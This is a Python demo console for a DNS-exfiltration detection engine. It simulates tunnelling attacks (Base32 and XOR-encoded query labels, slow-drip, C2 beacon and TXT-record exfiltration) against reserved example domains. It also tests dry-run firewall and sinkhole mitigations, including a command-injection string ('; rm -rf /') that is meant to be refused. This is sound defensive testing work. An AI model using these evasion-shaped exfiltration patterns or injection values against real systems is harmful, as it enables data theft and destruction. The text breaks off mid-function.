#!/usr/bin/env python3
"""ExFilTrap Attack + Response Console — interactive live-demo driver.

One terminal, one menu. Two halves:

* **attack** — pick an attacker behaviour, watch it run, read the verdict
  straight off the running engine's localhost API. Built for project demos:
  you cannot wait for a real attacker, so this plays one.
* **response** — drive every mitigation backend (log / iptables / netsh /
  domain sinkhole / policy TTL + allowlist) for real and print the evidence.
  This half is offline: no root, no firewall change, no running engine.

Why a terminal console and not a GUI app:
  * zero packaging risk (the attack half is stdlib only, runs on any python3,
    even over SSH);
  * the desktop dashboard is already the visual showpiece — this console is
    the attacker + the referee, and prints exactly what to show next.

The traffic is REAL DNS sent through the real resolver, so the engine's
live capture sees it on the wire exactly as it would an intrusion. All
synthetic payloads use the IETF-reserved documentation domain
(`tunnel.example`) — nothing here touches a real system.

Usage:
  python3 tools/demo_console.py                  # interactive menu
  python3 tools/demo_console.py --list           # scenario + check catalogue
  python3 tools/demo_console.py --scenario smash_grab --intensity high
  python3 tools/demo_console.py --story          # scripted full demo
  python3 tools/demo_console.py --mitigations    # every response backend
  python3 tools/demo_console.py --mitigation e2e # one check
  python3 tools/demo_console.py --live-mitigation  # sinkhole round-trip
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import random
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request

API = "http://127.0.0.1:5050"
UP_RESOLVER = None                   # resolved upstream (set in main())
STUB = "127.0.0.53"                 # systemd-resolved (loopback session)
DEFAULT_TUNNEL = "tunnel.example"   # IETF-reserved for documentation

EVERYDAY = ["google.com", "youtube.com", "wikipedia.org", "github.com",
            "cloudflare.com", "netflix.com", "openai.com", "ubuntu.com",
            "mint.org", "stackoverflow.com", "amazon.com", "linkedin.com"]
SCARY = ["ransomware.com", "c2server.com", "botnet-zombie.io",
         "malware-download.net", "darkweb-c2.ru", "keylogger-shop.com"]
PHONETIC = ["bavoke", "taminor", "kelupa", "soravi", "mudane", "revaso",
            "nuveda", "latomi", "gesura", "vokemi", "dapula", "piloc"]


# ----------------------------------------------------------------- engine IO
def api(path: str):
    with urllib.request.urlopen(API + path, timeout=5) as r:
        return json.load(r)


def api_post(path: str, body: dict, method: str = "POST"):
    """Write to the engine API (localhost-only console actions)."""
    req = urllib.request.Request(
        API + path, data=json.dumps(body).encode(), method=method,
        headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.load(r)


def engine_info():
    try:
        s = api("/api/status")
        return s
    except Exception:
        return None


def snap() -> dict:
    t = api("/api/stats")["totals"]
    return {"queries": t["queries"], "flagged": t["flagged"],
            "confirmed": t["confirmed"], "blocked": t["blocked"]}


def upstream_resolver() -> str:
    """The real LAN/upstream resolver (queries must leave via the NIC the
    engine captures)."""
    try:
        out = subprocess.run(["resolvectl", "dns"], capture_output=True,
                             text=True, timeout=5).stdout
        for token in out.split():
            if token.count(".") == 3 and not token.startswith("127."):
                return token
    except Exception:
        pass
    return "1.1.1.1"


# ------------------------------------------------------------- DNS machinery
class DnsSender:
    """Raw UDP DNS query sender (user space, no root needed)."""

    def __init__(self, server: str):
        self.server = server
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sent = 0

    def query(self, name: str, qtype: int = 1, txid: int | None = None):
        qname = b"".join(bytes([len(p)]) + p.encode()
                         for p in name.split(".")) + b"\x00"
        msg = struct.pack(">HHHHHH", (txid or self.sent + 1) & 0xFFFF,
                          0x0100, 1, 0, 0, 0) + qname + \
            struct.pack(">HH", qtype, 1)
        self.sock.sendto(msg, (self.server, 53))
        self.sent += 1

    def close(self):
        self.sock.close()


def paced(s: DnsSender, names, qps: float, rng: random.Random, jitter=0.15):
    """Send names at ~qps with relative jitter; shows inline progress."""
    interval = 1.0 / qps
    t0 = time.time()
    for i, name in enumerate(names):
        remain = t0 + interval * (1 + rng.uniform(-jitter, jitter)) * (i + 1)
        delay = remain - time.time()
        if delay > 0:
            time.sleep(delay)
        s.query(name)
        if (i + 1) % 5 == 0 or i == len(names) - 1:
            print(f"\r    packets sent: {i + 1}/{len(names)}   ",
                  end="", flush=True)
    print()


# ------------------------------------------------------- payload constructors
def b32_qname(payload: bytes, tunnel: str, chunk: int = 50) -> str:
    enc = base64.b32encode(payload).decode().rstrip("=")
    return ".".join(enc[i:i + chunk] for i in range(0, len(enc), chunk)) \
        + "." + tunnel


def xor_key_stream(key: bytes, plain: bytes) -> bytes:
    """XOR `plain` under a repeating keystream — index-free (the per-chunk
    index lives in the payload text, not the cipher loop)."""
    return bytes(b ^ key[n % len(key)] for n, b in enumerate(plain))


def phonetic_label(rng) -> str:
    return "-".join(rng.choice(PHONETIC) for _ in range(2))


# ------------------------------------------------------------------ intensity
INTENSITY = {
    "low":    dict(note="gentle — quick to run, still detectable"),
    "medium": dict(note="realistic middle ground"),
    "high":   dict(note="full-throttle — the version evaluators remember"),
}


# ------------------------------------------------------------------ scenarios
# Each scenario: key, title, story (what to tell the evaluators), expect,
# and run(sender, rng, intensity, tunnel) -> list of names sent (informational)
SCENARIOS: list[dict] = []


def scenario(key, title, story, expect, quiet=False):
    """``quiet=True`` marks a control scenario where zero alerts is the
    PASS result (attack scenarios get an explicit ❌ instead)."""
    def deco(fn):
        SCENARIOS.append(dict(key=key, title=title, story=story,
                              expect=expect, run=fn, quiet=quiet))
        return fn
    return deco


@scenario("smash_grab", "Smash-and-grab mass dump",
          "attacker dumps a whole file at once — loud Base32 tunnel at high "
          "query rate",
          "flagged + CONFIRMED with decoded payloads (dashboard → Alerts ▸ "
          "CONFIRMED)")
def smash_grab(s, rng, it, tunnel):
    cfg = {"low": (16, 3.0), "medium": (25, 5.0), "high": (40, 8.0)}[it]
    n, qps = cfg
    names = [b32_qname(b"QUARTERLY-RESULTS-XLSX " + bytes([i]) * 2,
                       tunnel) for i in range(n)]
    paced(s, names, qps, rng)


@scenario("ramp_up", "Careful attacker ramping up",
          "attacker starts tiny and slow, probes your defenses, then "
          "escalates rate and payload — the realistic intrusion arc",
          "flagged climbs as the session mass grows (dashboard → Sessions)")
def ramp_up(s, rng, it, tunnel):
    cfg = {"low": 16, "medium": 24, "high": 36}[it]
    names = []
    for i in range(cfg):
        frac = i / max(cfg - 1, 1)
        size = int(4 + frac * 24)          # 4B → 28B payload
        interval = 4.0 - frac * 3.3        # ~4s → ~0.7s
        enc = base64.b32encode(b"stage" + bytes([i]) * size).decode()
        names.append((enc[:60] + "." + tunnel, interval))
    t0 = time.time()
    for i, (name, interval) in enumerate(names):
        remain = t0 + interval * (i + 1)
        if remain > time.time():
            time.sleep(remain - time.time())
        s.query(name)
        if (i + 1) % 4 == 0 or i == len(names) - 1:
            print(f"\r    packets sent: {i + 1}/{len(names)}   ",
                  end="", flush=True)
    print()


@scenario("slow_drip_hex", "Encrypted slow-drip (hex chunks)",
          "XOR-encrypted ~32–48B chunks every ~3.6s — low-rate stealth "
          "exfil; 16+ queries/min to one zone trips the velocity gate on "
          "any baseline",
          "HIGH velocity/slow-drip alerts (dashboard → Alerts)")
def slow_drip_hex(s, rng, it, tunnel):
    # 16 q in 60s to one base domain trips the per-domain velocity gate
    # (DOMAIN_VELOCITY_COUNT=15, entropy>=3.0) — deterministic on any baseline
    cfg = {"low": (16, 4.2, 3.4), "medium": (18, 4.0, 3.2),
           "high": (22, 3.4, 2.8)}[it]
    n, tmax, tmin = cfg
    key = rng.randbytes(16)
    for i in range(n):
        plain = f"chunk-{i}-of-secret-document".encode()
        # 32-48B chunks: still a slow, low-rate drip, but each query
        # carries enough entropy-weighted mass to clear the session
        # elevation gate (1.8x population mean) even on a busy baseline
        # where prior loud attacks raised the learned population mass
        enc = xor_key_stream(key, plain)[: rng.randint(32, 48)]
        s.query(enc.hex() + "." + tunnel)
        print(f"\r    packets sent: {i + 1}/{n}   ", end="", flush=True)
        if i < n - 1:
            time.sleep(rng.uniform(tmin, tmax))
    print()


@scenario("glacial_drip", "Glacial drip (the patient attacker)",
          "one small encrypted fragment every ~15–30s — 'death by a "
          "thousand cuts'. The hardest regime: no per-query alert, and the "
          "stateful verdict needs minutes of accumulation on a clean "
          "baseline",
          "watch the fragments appear silently in Live Queries; alerts "
          "accrue over time (honest demo: show the difficulty, then the "
          "burst act catches the same attacker later)")
def glacial_drip(s, rng, it, tunnel):
    cfg = {"low": (3, 15.0), "medium": (5, 20.0), "high": (6, 30.0)}[it]
    n, base = cfg
    key = rng.randbytes(16)
    for i in range(n):
        plain = f"fragment-{i}-of-large-file".encode()
        enc = xor_key_stream(key, plain)[:34]
        s.query(enc.hex() + "." + tunnel)
        print(f"\r    packets sent: {i + 1}/{n}   ", end="", flush=True)
        if i < n - 1:
            time.sleep(base + rng.uniform(-2, 2))
    print()


@scenario("phonotactic_stealth", "Phonotactic stealth labels",
          "pronounceable, individually-benign-looking labels (Al Musa '25) "
          "paced at human-like intervals — evades per-query classifiers",
          "stateful session analysis catches it (mass accumulation)")
def phonotactic_stealth(s, rng, it, tunnel):
    cfg = {"low": (8, 7.0), "medium": (14, 6.0), "high": (20, 5.0)}[it]
    n, gap = cfg
    names = [f"{phonetic_label(rng)}.sync.{tunnel}" for _ in range(n)]
    paced(s, names, 1.0 / gap, rng, jitter=0.0)


@scenario("nested_enc", "Double-obfuscated tunnel",
          "XOR-encrypted THEN Base32-encoded THEN split into DNS labels — "
          "for when the attacker hides even the encoding",
          "high-entropy labels + CONFIRMED decodes via base32 layer")
def nested_enc(s, rng, it, tunnel):
    cfg = {"low": (16, 3.5), "medium": (18, 5.0), "high": (30, 7.0)}[it]
    n, qps = cfg
    key = rng.randbytes(16)
    names = []
    for i in range(n):
        plain = f"double-secret-{i}".encode()
        names.append(b32_qname(xor_key_stream(key, plain), tunnel))
    paced(s, names, qps, rng)


@scenario("beacon_c2", "Machine-periodic C2 beacon",
          "implant checking in at an EXACT interval to ONE c2 domain, zero "
          "jitter — timing is the fingerprint no payload can hide",
          "HIGH 'beacon regularity: machine-periodic query timing (M3b)' "
          "alerts once ≥20 exact-interval check-ins accumulate")
def beacon_c2(s, rng, it, tunnel):
    cfg = {"low": (22, 5.5), "medium": (24, 5.2), "high": (30, 5.0)}[it]
    n, period = cfg
    # Dedicated zone: base_domain() keeps the last two labels, so a
    # c2.tunnel.example beacon collapses into 'tunnel.example' and the
    # timing series mixes with every other scenario. 'c2beacon.example'
    # is its own base domain → pure exact-interval series.
    domain = "c2beacon.example"
    # wire diagnostics (2026-09-10 marathon): the engine stored 2x rows
    # per beacon query ~0.57s apart — sniff our own beacons back to see
    # whether the duplicate is a kernel echo or a second sender.
    import threading
    wire = {"n": 0, "seen": []}
    sn = None

    def _wire_prn(pkt):
        try:
            if wire["n"] >= 400:
                return
            from scapy.all import DNS, UDP
            if DNS not in pkt or UDP not in pkt or pkt[DNS].qd is None:
                return
            if not bytes(pkt[DNS].qd.qname).startswith(b"\x05hb"):
                return
            wire["seen"].append((round(float(pkt.time), 2),
                                 pkt[DNS].id, pkt[UDP].sport))
            wire["n"] += 1
        except Exception:
            pass

    try:
        from scapy.all import AsyncSniffer
        sn = AsyncSniffer(iface="lo", filter="udp port 53", store=False,
                          prn=_wire_prn)
        sn.start()
    except Exception as e:   # scapy absent / no perms — diagnostics only
        print(f"    (wire diag unavailable: {e})")
    for i in range(n):
        s.query(f"hb{i:03d}." + domain)
        print(f"\r    beacons: {i + 1}/{n} (exact {period:.1f}s period)   ",
              end="", flush=True)
        if i < n - 1:
            time.sleep(period)
    print()
    if sn is not None:
        time.sleep(1.5)
        try:
            sn.stop()
        except Exception:
            pass
        seen = wire["seen"]
        ports = sorted({sp for _, _, sp in seen})
        txids = sorted({tid for _, tid, _ in seen})
        print(f"    wire-diag: {len(seen)} beacon packets captured, "
              f"{len(ports)} source ports {ports[:6]}, "
              f"{len(txids)} distinct txids")


@scenario("dns_sweep", "Subdomain enumeration sweep",
          "attacker mass-enumerates a zone with random subdomains — "
          "reconnaissance, not exfil, but the volume pattern is distinct",
          "volume + entropy HIGHs on the target zone")
def dns_sweep(s, rng, it, tunnel):
    cfg = {"low": (16, 3.0), "medium": (28, 5.0), "high": (40, 8.0)}[it]
    n, qps = cfg
    names = ["".join(rng.choice("abcdefghijklmnopqrstuvwxyz0123456789")
                     for _ in range(rng.randint(8, 20))) + ".enum." + tunnel
             for _ in range(n)]
    paced(s, names, qps, rng)


@scenario("mixed_smoke", "Attack hidden in benign noise",
          "normal browsing traffic runs the whole time while a tunnel "
          "hides inside it — the realistic network, and the hardest case",
          "flagged tunnel rows among clean everyday rows in Live Queries")
def mixed_smoke(s, rng, it, tunnel):
    cfg = {"low": (16, 2.5, 2.0), "medium": (16, 3.0, 2.5),
           "high": (24, 4.0, 3.0)}[it]
    n, qps, bgqps = cfg
    stop = threading.Event()

    def background():
        bs = DnsSender(UP_RESOLVER or STUB)
        while not stop.is_set():
            bs.query(rng.choice(EVERYDAY))
            time.sleep(1.0 / bgqps)
        bs.close()

    th = threading.Thread(target=background, daemon=True)
    th.start()
    try:
        names = [b32_qname(b"hidden-in-crowd " + bytes([i]) * 2, tunnel)
                 for i in range(n)]
        paced(s, names, qps, rng)
        time.sleep(2)
    finally:
        stop.set()
        th.join(timeout=3)


@scenario("txt_exfil", "TXT-record exfiltration",
          "same tunnel payloads but queried as TXT records — protocol "
          "variation attackers use to slip past naive filters",
          "qname-mass detection is qtype-agnostic: still flagged")
def txt_exfil(s, rng, it, tunnel):
    cfg = {"low": (10, 3.0), "medium": (18, 5.0), "high": (28, 7.0)}[it]
    n, qps = cfg
    names = [b32_qname(b"TXT-EXFIL " + bytes([i]) * 2, tunnel)
             for i in range(n)]
    interval = 1.0 / qps
    t0 = time.time()
    for i, name in enumerate(names):
        remain = t0 + interval * (i + 1)
        if remain > time.time():
            time.sleep(remain - time.time())
        s.query(name, qtype=16)
        if (i + 1) % 5 == 0 or i == len(names) - 1:
            print(f"\r    packets sent: {i + 1}/{len(names)}   ",
                  end="", flush=True)
    print()


@scenario("scary_benign", "False-positive trap (control)",
          "30 everyday domains mixed with scary-looking but harmless names "
          "— a good engine flags little or none of it",
          "LOW risk rows in Live Queries; clean rate stays high — proves "
          "precision, not just recall", quiet=True)
def scary_benign(s, rng, it, tunnel):
    names = [rng.choice(EVERYDAY) for _ in range(30)] + \
            [rng.choice(SCARY) for _ in range(12)]
    rng.shuffle(names)
    paced(s, names, 2.0, rng)


# ------------------------------------------------------------------- running
def print_verdict(before: dict, settle: float = 4.0,
                  zone: str = DEFAULT_TUNNEL, since: float = 0.0,
                  quiet: bool = False):
    time.sleep(settle)
    try:
        after = snap()
    except Exception as e:
        print(f"  (engine unreachable for verdict: {e})")
        return
    print("  ── verdict (engine API) " + "─" * 34)
    print(f"   engine deltas (whole machine, background included): "
          f"queries {after['queries'] - before['queries']:+d}, "
          f"flagged {after['flagged'] - before['flagged']:+d}, "
          f"confirmed {after['confirmed'] - before['confirmed']:+d}")
    try:
        ev = api("/api/events?limit=300")["events"]
        fresh = [e for e in ev if e.get("ts", 0) >= since - 1.0]
        zone_ev = [e for e in fresh if zone in e.get("qname", "")]
        if zone_ev:
            import collections
            by = collections.Counter(e["risk_level"] for e in zone_ev)
            print(f"   THIS attack ({zone}): "
                  + ", ".join(f"{k} ×{v}" for k, v in sorted(by.items())))
            if not quiet:
                strong = sum(v for k, v in by.items()
                             if k in ("HIGH", "CONFIRMED"))
                if strong:
                    print(f"   ✅ engine caught it — {strong} "
                          f"HIGH/CONFIRMED on this zone")
                else:
                    print("   ⚠ engine saw the zone but did not escalate "
                          "past LOW/MEDIUM")
            conf = [e for e in zone_ev if e["risk_level"] == "CONFIRMED"]
            for e in (conf or zone_ev)[:3]:
                dec = (e.get("decoded_preview") or e.get("decoded")
                       or "").replace("\n", " ")[:44]
                print(f"     {e['risk_level']:9s} {e['qname'][:44]:44s}"
                      f" {dec}")
        elif quiet:
            print(f"   THIS attack ({zone}): no alerts raised — control "
                  "scenario: that is the PASS result")
        else:
            print(f"   THIS attack ({zone}): ❌ NO alerts — the engine did "
                  "not catch it (check the capture banner above; a cold "
                  "baseline also needs ~5 min to warm up)")
    except Exception:
        pass
    print("  ─" * 22)
    print("  dashboard: http://127.0.0.1:5050  →  Overview for counters, "
          "Alerts ▸ CONFIRMED for decodes")


def run_scenario(sc: dict, intensity: str, tunnel: str, up: str) -> None:
    print()
    print("═" * 66)
    print(f"  {sc['title']}   [intensity: {intensity}]")
    print("═" * 66)
    print(f"  story : {sc['story']}")
    print(f"  expect: {sc['expect']}")
    if intensity == "high" and sc["key"] == "glacial_drip":
        print("  note  : high glacial takes ~3 minutes — patience is the "
              "attack")
    try:
        before = snap()
    except Exception:
        before = None
        print("  ⚠ engine API unreachable — traffic still sends, but no "
              "verdicts (is the service running?)")
    sender = DnsSender(up)
    t0 = time.time()
    try:
        sc["run"](sender, random.Random(int(time.time())), intensity, tunnel)
    finally:
        sender.close()
    print(f"  done in {time.time() - t0:.0f}s — {sender.sent} DNS queries "
          f"via {up}")
    if before is not None:
        # beacon lives on its own dedicated zone (see scenario)
        zone = "c2beacon.example" if sc["key"] == "beacon_c2" else tunnel
        print_verdict(before, zone=zone, since=t0,
                      quiet=sc.get("quiet", False))
        if sc["key"] == "beacon_c2":
            try:
                ss = api("/api/sessions").get("sessions", [])
                hit = [x for x in ss if x.get("beacon")
                       or x.get("domain_beacon")]
                if hit:
                    for x in hit:
                        print(f"  ✅ session beacon flag: {x['src_ip']} "
                              f"cv={x.get('interval_cv')}")
                else:
                    print("  (per-session BEACON chip needs one IP's traffic "
                          "to be only beacons — on a shared desktop IP the "
                          "M3b alerts above are the verdict)")
            except Exception:
                pass


def demo_story(tunnel: str, up: str) -> None:
    """Scripted sequence for presenting: benign wash → escalating attacker.
    Narration printed between acts; run the dashboard on a projector."""
    by_key = {s["key"]: s for s in SCENARIOS}
    acts = [
        ("scary_benign", "low",
         "ACT 1 — a normal network. Everyday browsing plus scary-looking "
         "but harmless names. Watch the clean rate stay high."),
        ("ramp_up", "low",
         "ACT 2 — an attacker arrives. Starts tiny, probes, escalates. "
         "The session tracker is learning."),
        ("beacon_c2", "low",
         "ACT 3 — the implant checks in at machine-regular intervals. "
         "Timing analysis (Sessions ▸ BEACON) is the fingerprint."),
        ("slow_drip_hex", "medium",
         "ACT 4 — data starts leaving: encrypted chunks, low and slow. "
         "Each query alone looks harmless; the zone-velocity and mass "
         "analysis light up."),
        ("smash_grab", "high",
         "ACT 5 — impatient, the attacker dumps everything. Base32 "
         "tunnel at full rate — watch CONFIRMED decodes climb on the "
         "dashboard, then open Alerts ▸ CONFIRMED to show the recovered "
         "payloads."),
    ]
    for key, inten, narration in acts:
        print("\n" + "▄" * 66)
        print(narration)
        print("▄" * 66)
        try:
            input("  ⏎ press Enter to run this act (Ctrl-C to abort)… ")
        except KeyboardInterrupt:
            print("\nstory aborted")
            return
        run_scenario(by_key[key], inten, tunnel, up)
    print("\n=== story complete — close on the Overview counters and the "
          "CONFIRMED alert table ===")


# ================================================================= mitigation
# The half above proves the engine SEES an attack. This half proves the
# RESPONSE works.
#
# Everything here drives the SHIPPED classes with real RiskAssessment
# objects, in-process. dry_run defaults to True on every backend, so this
# needs no root, no firewall change and no running engine — it is the
# reproducible half of "does the mitigation actually do anything".
#
# The live half (--live-mitigation) exercises the one response that IS
# runtime-switchable on a running engine: the domain sinkhole. The backend
# KIND (log/iptables/netsh) is chosen when the engine starts, not from here —
# so this section also prints the exact relaunch line for each.
#
# Sys.path note: this file is stdlib-only by design (runs over SSH, no venv
# needed for the attack half). The mitigation half imports the project, so
# the repo root is prepended explicitly rather than relying on the CWD.
_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)


class _Clock:
    """Deterministic clock: TTL and strike windows become testable."""

    def __init__(self, t: float = 1_000_000.0):
        self.t = t

    def __call__(self) -> float:
        return self.t

    def advance(self, dt: float) -> None:
        self.t += dt


def _assess(level: str, ip: str = "203.0.113.9",
            qname: str = "leak.tunnel.example", ts: float = 1000.0, **kw):
    """A real RiskAssessment with only the fields the backend reads set."""
    from exfiltrap.risk_engine import RiskAssessment

    return RiskAssessment(src_ip=ip, qname=qname, timestamp=ts,
                          risk_level=level, **kw)


def _read_text(path: str) -> str:
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            return fh.read()
    except OSError:
        return ""


def _tmp_hosts():
    """A private hosts file: the real /etc/hosts is never touched here."""
    d = tempfile.mkdtemp(prefix="exfiltrap-mit-")
    return d, os.path.join(d, "hosts")


def _rmtree(path: str) -> None:
    import shutil

    shutil.rmtree(path, ignore_errors=True)


class _Ledger:
    """Storage double: records what the pipeline decided AND what it did."""

    def __init__(self):
        self.queries: list = []
        self.events: list = []
        self.blocks: list = []
        self.hits: list = []

    def log_query(self, a):
        self.queries.append(a)

    def log_risk_event(self, a):
        self.events.append(a)

    def log_block(self, ts, target, level, **kw):
        self.blocks.append(dict(ts=ts, target=target, level=level, **kw))

    def log_sinkhole_hit(self, ts, qname, base):
        self.hits.append((ts, qname, base))


MIT_CHECKS: list[dict] = []


def mit_check(key, title, expect, group="backend"):
    def deco(fn):
        MIT_CHECKS.append(dict(key=key, title=title, expect=expect,
                               group=group, run=fn))
        return fn
    return deco


# ------------------------------------------------------------ firewall backends
@mit_check("log", "LogOnlyMitigation — the dry deployment",
           "blocks on HIGH/CONFIRMED only; LOW and MEDIUM are recorded as "
           "decisions but never block; a duplicate block is idempotent",
           group="backend")
def _mit_log():
    from exfiltrap import config
    from exfiltrap.mitigation import LogOnlyMitigation

    m = LogOnlyMitigation()
    got = {lv: m.notify(_assess(lv)) for lv in ("LOW", "MEDIUM", "HIGH")}
    dup = m.notify(_assess("HIGH"))
    blocked = sorted(m.blocked_ips)
    un = m.unblock_ip("203.0.113.9")
    ok = (got == {"LOW": False, "MEDIUM": False, "HIGH": True}
          and dup is False and blocked == ["203.0.113.9"] and un is True
          and m.is_blocked("203.0.113.9") is False)
    return ok, [
        f"gate  config.MITIGATION_RISK_LEVELS = "
        f"{config.MITIGATION_RISK_LEVELS}",
        "notify " + "  ".join(f"{k}->{v}" for k, v in got.items())
        + f"   HIGH again->{dup} (duplicate suppressed)",
        f"ledger events = {m.events}",
        f"unblock_ip -> {un}; is_blocked afterwards = "
        f"{m.is_blocked('203.0.113.9')}",
    ]


@mit_check("iptables-refuse", "iptables backend — the safety rail",
           "with no nsA and no override the backend RAISES instead of "
           "touching the host firewall", group="backend")
def _mit_ipt_refuse():
    from exfiltrap import config
    from exfiltrap.mitigation import (IptablesMitigation, SafetyError,
                                      namespace_exists)

    m = IptablesMitigation(dry_run=True)
    ns = namespace_exists(config.NAMESPACE_NAME)
    if ns:
        r = m.block_ip("203.0.113.9")
        cmd = (m.pending_commands() or [[]])[0]
        scoped = cmd[:3] == ["ip", "netns", "exec"]
        return (r is True and scoped), [
            f"namespace {config.NAMESPACE_NAME!r} EXISTS on this host",
            f"rule generated scoped to it: {' '.join(cmd)}",
            "→ the host ruleset is untouched by construction: the netns "
            "prefix makes the kernel apply it inside nsA only",
        ]
    try:
        m.block_ip("203.0.113.9")
        return False, [
            f"namespace {config.NAMESPACE_NAME!r} does not exist",
            "BUT block_ip returned without raising — the host firewall was "
            "reachable. This is the bug the rail exists to prevent.",
        ]
    except SafetyError as exc:
        return True, [
            f"namespace {config.NAMESPACE_NAME!r} exists = {ns}",
            f"SafetyError raised: {exc}",
            f"commands recorded = {m.pending_commands()} (empty — nothing ran)",
        ]


@mit_check("iptables-override", "iptables override — the only host-firewall path",
           "the literal --i-know-this-is-isolated flag generates the DROP "
           "rule, and it is STILL dry-run: validated and logged, never "
           "executed", group="backend")
def _mit_ipt_override():
    from exfiltrap import config
    from exfiltrap.mitigation import IptablesMitigation

    m = IptablesMitigation(dry_run=True,
                           override_flag=config.IPTABLES_OVERRIDE_FLAG)
    r = m.block_ip("203.0.113.9")
    cmds = m.pending_commands()
    want = ["iptables", "-A", "INPUT", "-s", "203.0.113.9", "-j", "DROP"]
    return (r is True and cmds == [want]), [
        f"override_flag = {config.IPTABLES_OVERRIDE_FLAG!r}",
        f"block_ip -> {r}",
        f"rule  {' '.join(cmds[0]) if cmds else '(none)'}",
        "executed? NO — dry_run=True. Actually running it is a second, "
        "separate operator decision (--execute).",
        f"errors = {m.errors()}",
    ]


@mit_check("ip-validation", "IP validation — injection into the firewall",
           "malformed and hostile strings are refused before any command is "
           "ever built", group="backend")
def _mit_ip_validation():
    from exfiltrap import config
    from exfiltrap.mitigation import IptablesMitigation, SafetyError

    m = IptablesMitigation(dry_run=True,
                           override_flag=config.IPTABLES_OVERRIDE_FLAG)
    bad = ["999.1.1.1", "1.2.3", "not-an-ip", "1.2.3.4; rm -rf /",
           "1.2.3.4 -j ACCEPT"]
    refused, leaked = [], []
    for b in bad:
        try:
            m.block_ip(b)
            leaked.append(b)
        except SafetyError:
            refused.append(b)
    good = m.block_ip("203.0.113.9")
    return (not leaked and good is True), [
        f"refused {len(refused)}/{len(bad)}: "
        + ", ".join(repr(b) for b in refused),
        (f"!! ACCEPTED (must not happen): {leaked}" if leaked
         else "accepted: none"),
        f"a valid IP still works: block_ip('203.0.113.9') -> {good}",
    ]


@mit_check("netsh-admin", "netsh backend — the elevation rail",
           "without an elevated process the backend REFUSES; it never fires a "
           "UAC prompt from inside a detection loop", group="backend")
def _mit_netsh_admin():
    from exfiltrap import privileges
    from exfiltrap.mitigation import NetshMitigation, SafetyError

    m = NetshMitigation(dry_run=True, require_admin=True)
    root = bool(privileges.is_root())
    try:
        r = m.block_ip("203.0.113.9")
        return root, [
            f"privileges.is_root() = {root}",
            f"block_ip -> {r}",
            ("elevated (service account): the rule path is open" if root
             else "!! NOT elevated but block_ip returned — the rail failed"),
        ]
    except SafetyError as exc:
        return (not root), [
            f"privileges.is_root() = {root}",
            f"SafetyError: {exc}",
            "→ the rail holds: an interactive desktop process cannot rewrite "
            "the Windows firewall",
        ]


@mit_check("netsh-rule", "netsh backend — rule shape and reversal",
           "the generated rule carries the searchable ExfilTrap- prefix, and "
           "the delete rule reverses exactly that rule", group="backend")
def _mit_netsh_rule():
    from exfiltrap.mitigation import NetshMitigation

    m = NetshMitigation(dry_run=True, require_admin=False)
    r = m.block_ip("203.0.113.9")
    u = m.unblock_ip("203.0.113.9")
    cmds = m.pending_commands()
    name = f"name={NetshMitigation.RULE_PREFIX}203.0.113.9"
    want_add = ["netsh", "advfirewall", "firewall", "add", "rule", name,
                "dir=in", "action=block", "remoteip=203.0.113.9",
                "enable=yes"]
    want_del = ["netsh", "advfirewall", "firewall", "delete", "rule", name]
    ok = r is True and u is True and cmds == [want_add, want_del]
    return ok, [
        f"RULE_PREFIX = {NetshMitigation.RULE_PREFIX!r}",
        f"add     {' '.join(cmds[0]) if cmds else '(none)'}",
        f"delete  {' '.join(cmds[1]) if len(cmds) > 1 else '(none)'}",
        "both DRY-RUN: validated and logged, not executed",
    ]


# ----------------------------------------------------------- domain sinkhole
@mit_check("sinkhole-confirmed", "DomainSinkhole — CONFIRMED evidence",
           "a payload decoded from THIS qname sinks the exact hostname "
           "immediately, in BOTH address families", group="sinkhole")
def _mit_sink_confirmed():
    from exfiltrap.mitigation import DomainSinkhole

    d, hp = _tmp_hosts()
    try:
        sh = DomainSinkhole(hosts_path=hp, ttl=3600.0, clock=_Clock(), strikes=3)
        r = sh.notify(_assess("CONFIRMED", qname="exfil.tunnel.example",
                              confirmed_exfiltration=True))
        txt = _read_text(hp)
        ok = (r is True and sh.is_sunk("exfil.tunnel.example")
              and "0.0.0.0 exfil.tunnel.example" in txt
              and ":: exfil.tunnel.example" in txt)
        return ok, [
            f"notify(CONFIRMED) -> {r}",
            f"is_sunk('exfil.tunnel.example') = "
            f"{sh.is_sunk('exfil.tunnel.example')}",
            f"hosts file ({len(txt.splitlines())} lines):",
            *[f"    {ln}" for ln in txt.splitlines()],
            "→ A record AND AAAA record: an IPv4-only sink would let the "
            "query fall through to real DNS over IPv6",
        ]
    finally:
        _rmtree(d)


@mit_check("sinkhole-session-only", "DomainSinkhole — the 1.4.0 outage guard",
           "HIGH carrying ONLY session/timing evidence sinks nothing: on a "
           "single host that evidence describes the operator's own machine, "
           "and acting on it is what sank google.com", group="sinkhole")
def _mit_sink_session_only():
    from exfiltrap.mitigation import DomainSinkhole

    d, hp = _tmp_hosts()
    try:
        sh = DomainSinkhole(hosts_path=hp, ttl=3600.0, clock=_Clock(), strikes=3)
        r = sh.notify(_assess("HIGH", qname="slow.tunnel.example",
                              domain_signal=False, rf_probability=0.10))
        txt = _read_text(hp)
        ok = (r is False and sh.is_sunk("slow.tunnel.example") is False
              and not txt.strip())
        return ok, [
            "assessment: risk_level=HIGH, domain_signal=False, "
            "rf_probability=0.10 (session-level timing evidence only)",
            f"notify -> {r}    is_sunk -> "
            f"{sh.is_sunk('slow.tunnel.example')}",
            f"hosts file untouched: {txt!r}",
            "→ alert yes, sink no. A single timing signal can never take a "
            "machine offline.",
        ]
    finally:
        _rmtree(d)


@mit_check("sinkhole-strikes", "DomainSinkhole — strike accumulation",
           "HIGH with a domain-level signal needs 3 verdicts on the same BASE "
           "domain before conviction; after that every future label under it "
           "sinks on sight", group="sinkhole")
def _mit_sink_strikes():
    from exfiltrap.mitigation import DomainSinkhole

    d, hp = _tmp_hosts()
    try:
        ck = _Clock()
        sh = DomainSinkhole(hosts_path=hp, ttl=3600.0, clock=ck, strikes=3)
        res = [sh.notify(_assess("HIGH", qname=f"s{i}.convict.example",
                                 domain_signal=True, ts=1000.0 + i))
               for i in range(3)]
        seen = sh.is_sunk("s2.convict.example")
        unseen = sh.is_sunk("s4.convict.example")
        ok = res == [False, False, True] and seen and unseen
        return ok, [
